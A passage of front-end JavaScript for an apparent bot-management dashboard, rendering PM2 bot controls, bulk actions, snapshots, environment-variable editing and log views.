                    ? `<button class="btn btn-ghost btn-sm" data-bot-act="restart" onclick="botAction('restart','${escJs(botName)}',this)"><i class="ti ti-refresh"></i>${esc(_t('actionTitle.restart'))}</button>
                       <button class="btn btn-danger btn-sm" data-bot-act="stop" onclick="botAction('stop','${escJs(botName)}',this)"><i class="ti ti-player-pause"></i>${esc(_t('actionTitle.stop'))}</button>`
                    : `<button class="btn btn-success btn-sm" data-bot-act="start" onclick="botAction('start','${escJs(botName)}',this)"><i class="ti ti-player-play"></i>${esc(_t('actionTitle.start'))}</button>`
                  }
                  <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${escJs(botName)}'})"><i class="ti ti-code"></i>${esc(_t('actionTitle.open'))}</button>
                  ${isAdmin() ? `<button class="btn btn-ghost btn-sm" onclick="exportBot('${escJs(botName)}')"><i class="ti ti-archive"></i>${esc(_t('backups.export') || _t('common.download'))}</button>
                  <button class="btn btn-danger btn-sm btn-icon" onclick="confirmDelete('${escJs(botName)}')" title="${esc(_t('actionTitle.delete'))}"><i class="ti ti-trash"></i></button>` : ''}
                </div>`;
              const group = detailCard.querySelector('.flex.gap-6');
              if (group) group.outerHTML = groupHtml;
            }
          }
          // 2) Bots list table + Dashboard table — replace the act-group for this bot row
          const isOnline = pm2.status === 'online';
          document.querySelectorAll(`tr[data-bot-row="${botName}"] .act-group`).forEach(group => {
            // Find this row's act-group and replace just the start/stop/restart trio
            const newHtml = isOnline
              ? `<button class="act-btn act-stop" title="${esc(_t('actionTitle.stop'))}"     onclick="botAction('stop','${escJs(botName)}',this)"><i class="ti ti-player-pause"></i></button>
                 <button class="act-btn"          title="${esc(_t('actionTitle.restart'))}"  onclick="botAction('restart','${escJs(botName)}',this)"><i class="ti ti-refresh"></i></button>`
              : `<button class="act-btn act-start" title="${esc(_t('actionTitle.start'))}"   onclick="botAction('start','${escJs(botName)}',this)"><i class="ti ti-player-play"></i></button>`;
            // Replace first 2 children (start/stop/restart buttons) without touching the rest
            const wrap = document.createElement('div');
            wrap.innerHTML = newHtml;
            // Insert new buttons at the top, remove the old first 2 children
            const existing = Array.from(group.children);
            // Remove old start/stop/restart trio (up to 2 buttons that match our handlers)
            existing.slice(0, 2).forEach(c => c.remove());
            // Prepend new ones
            while (wrap.firstChild) group.insertBefore(wrap.firstChild, group.firstChild);
          });
        }
      } catch (_) {}
    }, 1200);
  } catch (e) {
    toast('error', _t('toasts.error'), e.message);
  } finally {
    if (btn) { btn.disabled = false; btn.innerHTML = { start:'<i class="ti ti-player-play"></i>', stop:'<i class="ti ti-player-pause"></i>', restart:'<i class="ti ti-refresh"></i>' }[action] || ''; }
  }
}

function confirmDelete(botName) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(_t('bots.deleteConfirm'),
    `<p>${_t('bots.deleteConfirmDesc')}</p><p><code>/opt/${esc(botName)}</code></p>`,
    async () => {
      try {
        await NexusAPI.bots.delete(botName);
        App.bots = App.bots.filter(b => b.name !== botName);
        delete App.pm2StatusMap[botName];
        toast('success', _t('toasts.deleted'), botName);
        if (App.currentPage === 'bot') navigate('bots');
        else if (App.currentPage === 'dashboard') loadDashboard();
        else if (App.currentPage === 'bots') loadBotsList();
      } catch (e) {
        toast('error', _t('toasts.deleteError'), e.message);
      }
    }
  );
}

// ------------------------------------------------------------
// BOTS LIST
// ------------------------------------------------------------
async function loadBotsList() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-bots');
  page.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;
  try {
    const bots = await NexusAPI.bots.list();
    App.bots   = bots;
    document.getElementById('bots-badge').textContent = bots.length;
    const subtitle = bots.length > 1
      ? _t('botsPage.subtitlePlural', { n: bots.length })
      : _t('botsPage.subtitle', { n: bots.length });

    page.innerHTML = `
      <div class="flex-between mb-16">
        <div><div class="section-title mb-4"><i class="ti ti-robot"></i> ${esc(_t('botsPage.title'))}</div>
          <div style="font-size:12px;color:var(--tx-3);">${esc(subtitle)}</div>
        </div>
        <div class="flex gap-8">
          <input id="bot-search" class="form-control" style="width:200px;" placeholder="${esc(_t('botsPage.searchPh'))}" oninput="filterBotsList(this.value)"/>
          ${isAdmin() ? `<button class="btn btn-primary" onclick="navigate('new-bot')"><i class="ti ti-plus"></i>${esc(_t('botsPage.newBot'))}</button>` : ''}
        </div>
      </div>
      <div class="table-wrap">
        <div class="table-toolbar">
          <span class="table-title"><i class="ti ti-robot"></i> ${esc(_t('botsPage.allBots'))}</span>
          <div class="flex gap-8" style="align-items:center;flex-wrap:wrap;">
            <div class="tabs">
              <button class="tab-btn active" onclick="filterBotsTab('all',this)">${esc(_t('botsPage.all'))}</button>
              <button class="tab-btn" onclick="filterBotsTab('online',this)">${esc(_t('botsPage.online'))}</button>
              <button class="tab-btn" onclick="filterBotsTab('errored',this)">${esc(_t('botsPage.errored'))}</button>
            </div>
            ${bots.length ? `<div class="flex gap-6">
              <button class="btn btn-ghost btn-xs" onclick="bulkBotAction('start')"><i class="ti ti-player-play"></i>${esc(_t('botsPage.startAll'))}</button>
              <button class="btn btn-ghost btn-xs" onclick="bulkBotAction('restart')"><i class="ti ti-refresh"></i>${esc(_t('botsPage.restartAll'))}</button>
              <button class="btn btn-ghost btn-xs" onclick="bulkBotAction('stop')"><i class="ti ti-player-pause"></i>${esc(_t('botsPage.stopAll'))}</button>
            </div>` : ''}
          </div>
        </div>
        <div id="bots-table">${renderBotsTable(bots)}</div>
      </div>`;

    App.refreshTimers.bots = setInterval(async () => {
      const updated = await NexusAPI.bots.list().catch(() => null);
      if (updated) { App.bots = updated; }
    }, 10000);
  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);">${esc(e.message)}</div>`;
  }
}

function bulkBotTargets(action) {
  return (App.bots || []).filter(bot => {
    const status = (App.pm2StatusMap[bot.name] || bot.pm2)?.status;
    return action === 'start' ? status !== 'online' : status === 'online';
  });
}

async function bulkBotAction(action) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  if (App.bulkActionRunning) return;
  const targets = bulkBotTargets(action);
  if (!targets.length) {
    toast('info', _t('botsPage.bulkNoTarget'));
    return;
  }
  const label = action === 'start' ? _t('botsPage.startAll')
    : action === 'restart' ? _t('botsPage.restartAll')
    : _t('botsPage.stopAll');

  if (action !== 'start') {
    confirm(
      _t('botsPage.bulkConfirmTitle', { action: label, n: targets.length }),
      _t('botsPage.bulkConfirmDesc', { n: targets.length }),
      () => runBulkBotAction(action, targets),
      action === 'stop'
    );
    return;
  }
  await runBulkBotAction(action, targets);
}

async function runBulkBotAction(action, targets) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  App.bulkActionRunning = true;
  let ok = 0, fail = 0;
  await Promise.all(targets.map(async bot => {
    try {
      await NexusAPI.bots[action](bot.name);
      ok++;
    } catch (_) {
      fail++;
    }
  }));
  App.bulkActionRunning = false;
  if (fail) toast('warning', _t('botsPage.bulkPartial', { ok, fail }));
  else toast('success', _t('botsPage.bulkDone', { n: ok }));
  // Give PM2 a moment to report the new state, then refresh the table.
  await new Promise(resolve => setTimeout(resolve, 1200));
  if (App.currentPage === 'bots') loadBotsList();
  else if (App.currentPage === 'dashboard') loadDashboard();
}

function filterBotsList(query) {
  const q = query.toLowerCase();
  const list = q ? App.bots.filter(b => b.name.includes(q) || botDisplayName(b).toLowerCase().includes(q) || (b.description || '').toLowerCase().includes(q)) : App.bots;
  const el = document.getElementById('bots-table');
  if (el) el.innerHTML = renderBotsTable(list);
}

function filterBotsTab(filter, btn) {
  btn.closest('.tabs').querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const list = filter === 'online'  ? App.bots.filter(b => (App.pm2StatusMap[b.name] || b.pm2)?.status === 'online')
             : filter === 'errored' ? App.bots.filter(b => (App.pm2StatusMap[b.name] || b.pm2)?.status === 'errored')
             : App.bots;
  const el = document.getElementById('bots-table');
  if (el) el.innerHTML = renderBotsTable(list);
}

// ------------------------------------------------------------
// BOT DETAIL
// ------------------------------------------------------------
let _botAvatarDraft = null;

async function loadBotDetail(botName) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  markBotClean();
  const page = document.getElementById('page-bot');
  page.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;
  App.currentBotName = botName;

  try {
    const bot = await NexusAPI.bots.get(botName);
    let botEnv = { vars: [] };
    try { botEnv = await NexusAPI.bots.env(botName); } catch (_) {}
    _botAvatarDraft = bot.avatar || null;
    const [bg, color] = botColor(botName);
    const pm2 = App.pm2StatusMap[botName] || bot.pm2;
    const isOnline = pm2?.status === 'online';

    page.innerHTML = `
      <!-- Hero -->
      <div class="card mb-16" style="padding:16px;">
        <div style="display:flex;align-items:center;gap:14px;">
          <div class="bot-av" style="background:${bg};color:${color};width:48px;height:48px;border-radius:10px;font-size:18px;">${botAvatarInner(bot)}</div>
          <div style="flex:1;">
            <div style="font-size:18px;font-weight:700;color:var(--tx-1);">${esc(botDisplayName(bot))}${mcpBadge(bot)}</div>
            <div style="font-size:11px;color:var(--tx-3);font-family:var(--font-mono);">${esc(bot.name)} · /opt/${esc(botName)}</div>
          </div>
          <div class="flex gap-6">
            ${isOnline
              ? `<button class="btn btn-ghost btn-sm" onclick="botAction('restart','${escJs(botName)}',this)"><i class="ti ti-refresh"></i>${esc(_t('actionTitle.restart'))}</button>
                 <button class="btn btn-danger btn-sm" onclick="botAction('stop','${escJs(botName)}',this)"><i class="ti ti-player-pause"></i>${esc(_t('actionTitle.stop'))}</button>`
              : `<button class="btn btn-success btn-sm" onclick="botAction('start','${escJs(botName)}',this)"><i class="ti ti-player-play"></i>${esc(_t('actionTitle.start'))}</button>`
            }
            <button class="btn btn-ghost btn-sm" onclick="navigate('editor',{botName:'${escJs(botName)}'})"><i class="ti ti-code"></i>${esc(_t('actionTitle.open'))}</button>
            <button class="btn btn-ghost btn-sm" onclick="navigate('files',{botName:'${escJs(botName)}'})"><i class="ti ti-folder"></i>${esc(_t('filesPage.title'))}</button>
            ${isAdmin() ? `<button class="btn btn-ghost btn-sm" onclick="exportBot('${escJs(botName)}')"><i class="ti ti-archive"></i>${esc(_t('backups.export') || _t('common.download'))}</button>
            <button class="btn btn-danger btn-sm btn-icon" onclick="confirmDelete('${escJs(botName)}')" title="${esc(_t('actionTitle.delete'))}"><i class="ti ti-trash"></i></button>` : ''}
          </div>
        </div>
      </div>

      <div class="grid-3 mb-16">
        <!-- PM2 Status -->
        <div class="card">
          <div class="card-header"><span class="card-title"><i class="ti ti-activity"></i>${esc(_t('botDetail.pm2Status'))}</span><div data-bot-status="${esc(botName)}">${statusBadge(pm2)}</div></div>
          <div class="card-body">
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.pid'))}</span><span class="metric-val">${pm2?.pid || '—'}</span></div>
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.restarts'))}</span><span class="metric-val">${pm2?.restarts ?? '—'}</span></div>
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.uptime'))}</span><span class="metric-val">${fmtUptime(pm2?.uptime)}</span></div>
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.startedOn'))}</span><span class="metric-val">${fmtDate(bot.last_started)}</span></div>
          </div>
        </div>

        <!-- Resources -->
        <div class="card">
          <div class="card-header"><span class="card-title"><i class="ti ti-cpu"></i>${esc(_t('botDetail.resources'))}</span></div>
          <div class="card-body">
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.cpu'))}</span><span class="metric-val" data-bot-cpu="${esc(botName)}">${isOnline ? pm2.cpu + '%' : '—'}</span></div>
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.ram'))}</span><span class="metric-val" data-bot-mem="${esc(botName)}">${isOnline ? fmtMem(pm2.memory) : '—'}</span></div>
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.template'))}</span><span class="metric-val">${esc(bot.template || 'blank')}</span></div>
            <div class="metric-row"><span class="metric-key">${esc(_t('botDetail.createdOn'))}</span><span class="metric-val">${fmtDate(bot.created_at)}</span></div>
          </div>
        </div>

        <!-- Dependencies -->
        <div class="card">
          <div class="card-header"><span class="card-title"><i class="ti ti-package"></i>${esc(_t('botDetail.dependencies'))}</span>
            <button class="btn btn-ghost btn-xs" onclick="navigate('npm',{botName:'${escJs(botName)}'})">${esc(_t('botDetail.manage'))}</button>
          </div>
          <div class="card-body">
            ${bot.packageJson?.dependencies
              ? Object.entries(bot.packageJson.dependencies).slice(0,6).map(([k,v]) =>
                  `<div class="metric-row"><span class="metric-key">${esc(k)}</span><span class="metric-val">${esc(v)}</span></div>`
                ).join('') + (Object.keys(bot.packageJson.dependencies).length > 6 ? `<div style="font-size:11px;color:var(--tx-3);margin-top:6px;">${esc(_t('botDetail.moreDependencies', { n: Object.keys(bot.packageJson.dependencies).length - 6 }))}</div>` : '')
              : `<div style="color:var(--tx-3);font-size:12px;">${esc(_t('botDetail.noDependencies'))}</div>`
            }
          </div>
        </div>
      </div>

      <!-- Customization -->
      <div class="card mb-16">
        <div class="card-header"><span class="card-title"><i class="ti ti-palette"></i>${esc(_t('botCustom.title'))}</span></div>
        <div class="card-body">
          <div class="bot-custom-grid">
            <div class="bot-custom-avatar">
              <div class="bot-av" id="bot-avatar-preview" style="background:${bg};color:${color};width:72px;height:72px;border-radius:14px;font-size:24px;">${botAvatarInner(bot)}</div>
              <input type="file" id="bot-avatar-input" accept="image/png,image/jpeg,image/webp,image/gif" style="display:none" onchange="botAvatarPicked(this)"/>
              <div class="flex gap-6" style="justify-content:center;flex-wrap:wrap;">
                <button class="btn btn-ghost btn-xs" onclick="document.getElementById('bot-avatar-input').click()"><i class="ti ti-upload"></i>${esc(_t('botCustom.changeAvatar'))}</button>
                <button class="btn btn-ghost btn-xs" onclick="botAvatarRemove()"><i class="ti ti-x"></i>${esc(_t('botCustom.removeAvatar'))}</button>
              </div>
              <div class="form-hint" style="text-align:center;">${esc(_t('botCustom.avatarHint'))}</div>
            </div>
            <div class="bot-custom-fields">
              <div class="form-group">
                <label class="form-label">${esc(_t('botCustom.displayName'))}</label>
                <input class="form-control" id="bot-display-name" value="${esc(bot.display_name || bot.name)}" maxlength="80"/>
              </div>
              <div class="grid-2">
                <div class="form-group">
                  <label class="form-label">${esc(_t('botCustom.startupFile'))}</label>
                  <input class="form-control mono" id="bot-startup-file" value="${esc(bot.startup_file || 'index.js')}" placeholder="index.js"/>
                  <div class="form-hint">${esc(_t('botCustom.startupFileHint'))}</div>
                </div>
                <div class="form-group">
                  <label class="form-label">${esc(_t('botCustom.memoryLimit'))}</label>
                  <input class="form-control" id="bot-memory-limit" type="number" min="64" max="8192" step="64" value="${bot.memory_limit ? parseInt(bot.memory_limit, 10) : ''}" placeholder="512"/>
                  <div class="form-hint">${esc(_t('botCustom.memoryLimitHint'))}</div>
                </div>
              </div>
              <div class="grid-2">
                <div class="form-group">
                  <label class="form-label">${esc(_t('botCustom.restartCron'))}</label>
                  <input class="form-control mono" id="bot-restart-cron" value="${esc(bot.restart_cron || '')}" placeholder="0 4 * * *"/>
                  <div class="form-hint">${esc(_t('botCustom.restartCronHint'))}</div>
                </div>
                <div class="form-group">
                  <label class="form-label">${esc(_t('botCustom.autostart'))}</label>
                  <label class="toggle" style="margin-top:8px;">
                    <input type="checkbox" id="bot-autostart" ${bot.autostart ? 'checked' : ''}/>
                    <span class="toggle-label">${esc(_t('botCustom.autostartLabel'))}</span>
                  </label>
                  <div class="form-hint">${esc(_t('botCustom.autostartHint'))}</div>
                </div>
              </div>
              <div class="form-group">
                <label class="form-label">${esc(_t('botCustom.notes'))}</label>
                <textarea class="form-control" id="bot-notes" maxlength="4000" rows="3" placeholder="${esc(_t('botCustom.notesPh'))}">${esc(bot.notes || '')}</textarea>
                <div class="form-hint">${esc(_t('botCustom.notesHint'))}</div>
              </div>
              ${isAdmin() ? `<div class="form-group">
                <label class="toggle">
                  <input type="checkbox" id="bot-mcp-exposed" ${bot.mcp_exposed ? 'checked' : ''}/>
                  <span class="toggle-label">${esc(_t('botCustom.mcpExposed'))}</span>
                </label>
                <div class="form-hint">${esc(_t('botCustom.mcpExposedHint'))}</div>
              </div>` : ''}
              <div class="flex gap-8" style="justify-content:flex-end;">
                <button class="btn btn-primary btn-sm" id="btn-save-bot-custom" onclick="saveBotCustomization('${escJs(botName)}')"><i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}</button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Server snapshots -->
      <div class="card mb-16">
        <div class="card-header">
          <span class="card-title"><i class="ti ti-history"></i>${esc(_t('botDetail.snapshotsTitle'))}</span>
          <div class="flex gap-8" style="align-items:center;flex-wrap:wrap;">
            <input class="form-control" id="snapshot-label" maxlength="120" placeholder="${esc(_t('botDetail.snapshotLabelPh'))}" style="width:220px;height:30px;"/>
            <button class="btn btn-primary btn-sm" id="btn-create-snapshot" onclick="createBotSnapshot('${escJs(botName)}')"><i class="ti ti-camera"></i>${esc(_t('botDetail.snapshotCreate'))}</button>
          </div>
        </div>
        <div class="card-body" id="bot-snapshots"><div class="form-hint">${esc(_t('common.loading'))}</div></div>
        <div class="card-footer" style="font-size:11px;color:var(--tx-3);">${esc(_t('botDetail.snapshotsHint'))}</div>
      </div>

      <!-- Environment variables -->
      <div class="card mb-16">
        <div class="card-header">
          <span class="card-title"><i class="ti ti-key"></i>${esc(_t('botEnv.title'))}</span>
          <div class="flex gap-8" style="align-items:center;">
            <label class="form-check" style="font-size:11px;color:var(--tx-2);display:flex;align-items:center;gap:6px;">
              <input type="checkbox" id="env-show-secrets" onchange="toggleEnvSecrets()"/>
              ${esc(_t('botEnv.showValues'))}
            </label>
            <button class="btn btn-ghost btn-xs" onclick="addEnvRow()"><i class="ti ti-plus"></i>${esc(_t('botEnv.add'))}</button>
          </div>
        </div>
        <div class="card-body">
          <div id="env-rows">${renderEnvRows(botEnv.vars || [])}</div>
          <div class="form-hint" style="margin-top:10px;"><i class="ti ti-info-circle"></i>${esc(_t('botEnv.hint'))}</div>
        </div>
        <div class="card-footer" style="display:flex;justify-content:flex-end;">
          <button class="btn btn-primary btn-sm" id="btn-save-env" onclick="saveBotEnv('${escJs(botName)}')"><i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}</button>
        </div>
      </div>

      <!-- Logs -->
      <div class="card">
        <div class="card-header">
          <span class="card-title"><i class="ti ti-terminal"></i>${esc(_t('botDetail.logsFor', { name: botName }))}</span>
          <div class="flex gap-6">
            <div class="tabs">
              <button class="tab-btn active" onclick="switchTab('stdout','stderr',this)">${esc(_t('botDetail.stdout'))}</button>
              <button class="tab-btn" onclick="switchTab('stderr','stdout',this)">${esc(_t('botDetail.stderr'))}</button>
            </div>
            <button class="btn btn-ghost btn-xs" onclick="loadBotLogs('${escJs(botName)}')"><i class="ti ti-refresh"></i></button>
          </div>
        </div>
        <div id="stdout" style="background:var(--bg-base);border-radius:0 0 10px 10px;min-height:200px;max-height:300px;overflow-y:auto;padding:4px 0;">
          <div class="loader" style="background:transparent;padding:20px;"><div class="spinner"></div></div>
        </div>
        <div id="stderr" style="background:var(--bg-base);border-radius:0 0 10px 10px;min-height:200px;max-height:300px;overflow-y:auto;padding:4px 0;display:none;"></div>
      </div>`;

    loadBotLogs(botName);
    loadBotSnapshots(botName);

    // Live PM2 poll for this detail page
    App.refreshTimers.botDetail = setInterval(async () => {
      try {
        const p = await NexusAPI.bots.pm2Status(botName);
        if (p) { App.pm2StatusMap[botName] = p; patchBotStatusInUI(p); }
      } catch (_) {}
    }, 5000);

  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);">${esc(e.message)}</div>`;
  }
}

function botAvatarPicked(input) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  readSquareImage(input, 256, dataUrl => {
    _botAvatarDraft = dataUrl;
    markBotDirty('bot-custom');
    const preview = document.getElementById('bot-avatar-preview');
    if (preview) preview.innerHTML = `<img src="${_botAvatarDraft}" alt="" style="width:100%;height:100%;object-fit:contain;padding:2px;border-radius:inherit;"/>`;
    toast('success', _t('botCustom.avatarReady'), _t('botCustom.avatarReadyHint'));
  });
}

function botAvatarRemove() {
  markBotDirty('bot-custom');
  _botAvatarDraft = null;
  const preview = document.getElementById('bot-avatar-preview');
  if (preview) {
    const name = App.currentBotName || '';
    preview.innerHTML = botInitials(name);
  }
}

async function saveBotCustomization(botName) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const btn = document.getElementById('btn-save-bot-custom');
  if (btn) { btn.disabled = true; btn.innerHTML = `<span class="spinner spinner-sm"></span>`; }
  const memRaw = document.getElementById('bot-memory-limit')?.value?.trim();
  try {
    const payload = {
      display_name: document.getElementById('bot-display-name')?.value?.trim() || botName,
      avatar: _botAvatarDraft,
      autostart: !!document.getElementById('bot-autostart')?.checked,
      notes: document.getElementById('bot-notes')?.value || '',
      startup_file: document.getElementById('bot-startup-file')?.value?.trim() || 'index.js',
      memory_limit: memRaw ? `${parseInt(memRaw, 10)}M` : null,
      restart_cron: document.getElementById('bot-restart-cron')?.value?.trim() || null
    };
    if (isAdmin()) payload.mcp_exposed = !!document.getElementById('bot-mcp-exposed')?.checked;
    await NexusAPI.bots.update(botName, payload);
    toast('success', _t('botCustom.saved'), _t('botCustom.savedHint'));
    markBotClean(['bot-custom']);
    navigate('bot', { botName });
  } catch (e) {
    toast('error', _t('botCustom.saveError'), e.message);
  } finally {
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}`; }
  }
}

async function loadBotSnapshots(botName) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const el = document.getElementById('bot-snapshots');
  if (!el) return;
  try {
    const shots = await NexusAPI.bots.snapshots(botName);
    if (!document.getElementById('bot-snapshots')) return;
    if (!shots || shots.length === 0) {
      el.innerHTML = `<div class="empty-state" style="padding:18px;"><i class="ti ti-history"></i><span style="color:var(--tx-3);font-size:12px;">${esc(_t('botDetail.snapshotEmpty'))}</span></div>`;
      return;
    }
    el.innerHTML = shots.map(shot => `
      <div class="snapshot-row">
        <div class="snapshot-icon"><i class="ti ti-camera"></i></div>
        <div class="snapshot-main">
          <div class="snapshot-label">${esc(shot.label || _t('botDetail.snapshotUntitled'))}</div>
          <div class="snapshot-meta">${esc(fmtDate(shot.created_at))} · ${esc(fmtBytes(shot.size_bytes))}${shot.created_by ? ` · ${esc(shot.created_by)}` : ''}</div>
        </div>
        <div class="flex gap-6">
          <button class="btn btn-ghost btn-xs" onclick="restoreBotSnapshot('${escJs(botName)}', ${Number(shot.id)})"><i class="ti ti-restore"></i>${esc(_t('botDetail.snapshotRestore'))}</button>
          <button class="btn btn-danger btn-xs btn-icon" onclick="deleteBotSnapshot('${escJs(botName)}', ${Number(shot.id)})" title="${esc(_t('common.delete'))}"><i class="ti ti-trash"></i></button>
        </div>
      </div>`).join('');
  } catch (e) {
    el.innerHTML = `<div class="form-hint" style="color:var(--red);">${esc(e.message)}</div>`;
  }
}

async function createBotSnapshot(botName) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const btn = document.getElementById('btn-create-snapshot');
  const label = document.getElementById('snapshot-label')?.value?.trim() || '';
  if (btn) { btn.disabled = true; btn.innerHTML = `<span class="spinner spinner-sm"></span>`; }
  try {
    await NexusAPI.bots.createSnapshot(botName, label);
    const input = document.getElementById('snapshot-label');
    if (input) input.value = '';
    toast('success', _t('botDetail.snapshotCreated'));
    await loadBotSnapshots(botName);
  } catch (e) {
    toast('error', _t('botDetail.snapshotCreateError'), e.message);
  } finally {
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-camera"></i>${esc(_t('botDetail.snapshotCreate'))}`; }
  }
}

function restoreBotSnapshot(botName, id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(_t('botDetail.snapshotRestoreConfirm'), _t('botDetail.snapshotRestoreDesc'), async () => {
    try {
      await NexusAPI.bots.restoreSnapshot(botName, id);
      toast('success', _t('botDetail.snapshotRestored'));
      navigate('bot', { botName });
    } catch (e) {
      toast('error', _t('botDetail.snapshotRestoreError'), e.message);
    }
  });
}

function deleteBotSnapshot(botName, id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  confirm(_t('botDetail.snapshotDeleteConfirm'), _t('botDetail.snapshotDeleteDesc'), async () => {
    try {
      await NexusAPI.bots.deleteSnapshot(botName, id);
      toast('success', _t('botDetail.snapshotDeleted'));
      await loadBotSnapshots(botName);
    } catch (e) {
      toast('error', _t('common.error'), e.message);
    }
  });
}

function envLooksSecret(key) {
  return /(TOKEN|SECRET|PASSWORD|PASSWD|KEY|WEBHOOK|DSN|DATABASE_URL)/i.test(String(key || ''));
}

function envRowHTML(v = {}) {
  const key = String(v.key || '');
  const value = String(v.value || '');
  const secret = envLooksSecret(key);
  return `<div class="env-row">
    <input class="form-control mono env-key" placeholder="KEY" value="${esc(key)}"/>
    <input class="form-control mono env-val" placeholder="value" type="${secret ? 'password' : 'text'}" data-secret="${secret ? '1' : '0'}" value="${esc(value)}"/>
    <button class="btn btn-ghost btn-icon btn-sm" type="button" onclick="removeEnvRow(this)" title="${esc(window.NexusI18n ? NexusI18n.t('common.delete') : 'Delete')}"><i class="ti ti-x"></i></button>
  </div>`;
}

function renderEnvRows(vars) {
  if (!vars.length) return `<div class="env-empty">${esc(window.NexusI18n ? NexusI18n.t('botEnv.empty') : '')}</div>`;
  return vars.map(envRowHTML).join('');
}

function addEnvRow() {
  const rows = document.getElementById('env-rows');
  if (!rows) return;
  markBotDirty('bot-env');
  rows.querySelector('.env-empty')?.remove();
  rows.insertAdjacentHTML('beforeend', envRowHTML());
  const inputs = rows.querySelectorAll('.env-key');
  inputs[inputs.length - 1]?.focus();
}

function removeEnvRow(btn) {
  markBotDirty('bot-env');
  const row = btn.closest('.env-row');
  if (row) row.remove();
  const rows = document.getElementById('env-rows');
  if (rows && !rows.querySelector('.env-row')) {
    rows.innerHTML = `<div class="env-empty">${esc(window.NexusI18n ? NexusI18n.t('botEnv.empty') : '')}</div>`;
  }
}

function toggleEnvSecrets() {
  const show = !!document.getElementById('env-show-secrets')?.checked;
  document.querySelectorAll('#env-rows .env-val').forEach(input => {
    input.type = show ? 'text' : (input.dataset.secret === '1' ? 'password' : 'text');
  });
}

async function saveBotEnv(botName) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const rows = Array.from(document.querySelectorAll('#env-rows .env-row'));
  const vars = [];
  const seen = new Set();
  for (const row of rows) {
    const key = row.querySelector('.env-key')?.value?.trim() || '';
    const value = row.querySelector('.env-val')?.value || '';
    if (!key) continue;
    if (!/^[A-Za-z_][A-Za-z0-9_]{0,63}$/.test(key)) {
      toast('error', _t('botEnv.invalidKey'), key);
      return;
    }
    if (seen.has(key)) {
      toast('error', _t('botEnv.duplicateKey'), key);
      return;
    }
    seen.add(key);
    vars.push({ key, value });
  }
  const btn = document.getElementById('btn-save-env');
  if (btn) { btn.disabled = true; btn.innerHTML = `<span class="spinner spinner-sm"></span>`; }
  try {
    await NexusAPI.bots.updateEnv(botName, vars);
    markBotClean(['bot-env']);
    toast('success', _t('botEnv.saved'), _t('botEnv.savedHint'));
  } catch (e) {
    toast('error', _t('botEnv.saveError'), e.message);
  } finally {
    if (btn) { btn.disabled = false; btn.innerHTML = `<i class="ti ti-device-floppy"></i>${esc(_t('common.save'))}`; }
  }
}

async function loadBotLogs(botName) {  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  try {
    const logs = await NexusAPI.bots.logs(botName, 100);
    const outEl = document.getElementById('stdout');
    const errEl = document.getElementById('stderr');
    // Empty stdout is a perfectly valid state (silent bot / logging off).
    // It is NOT an error. stderr is where startup errors are reported.
    if (outEl) {
      outEl.innerHTML = logs.out.length
        ? logs.out.map(l => logLine(l)).join('')
        : `<div class="log-empty"><i class="ti ti-info-circle"></i> ${esc(_t('logs.emptyStdout'))}</div>`;
      outEl.scrollTop = outEl.scrollHeight;
    }
    if (errEl) {
      if (logs.err.length) {
        const rendered = logs.err.map(l => `<div class="log-line"><span class="log-err">${esc(window.NexusDiagnostics ? NexusDiagnostics.sanitize(l) : l)}</span></div>`).join('');
        const diag = window.NexusDiagnostics ? NexusDiagnostics.renderHTML(logs.err) : '';
        errEl.innerHTML = diag + rendered;
      } else {
        errEl.innerHTML = `<div class="log-empty"><i class="ti ti-info-circle"></i> ${esc(_t('logs.emptyStderr'))}</div>`;
      }
    }
  } catch (e) {
    const outEl = document.getElementById('stdout');
    if (outEl) outEl.innerHTML = `<div class="log-line"><span class="log-err">${esc(e.message)}</span></div>`;
  }
}

function switchTab(showId, hideId, btn) {
  btn.closest('.tabs').querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const s = document.getElementById(showId); if (s) s.style.display = '';
  const h = document.getElementById(hideId); if (h) h.style.display = 'none';
}

function logLine(l) {
  let cls = 'log-out';
  if (/error|err|fatal/i.test(l)) cls = 'log-err';
  else if (/warn/i.test(l))       cls = 'log-warn';
  else if (/connecté|connecte|prêt|pret|ready|actif|active|démarré|demarre|started|en ligne|online/i.test(l)) cls = 'log-ok';
  return `<div class="log-line"><span class="${cls}">${esc(l)}</span></div>`;
}

// ------------------------------------------------------------
// NEW BOT — 3-step wizard
// ------------------------------------------------------------
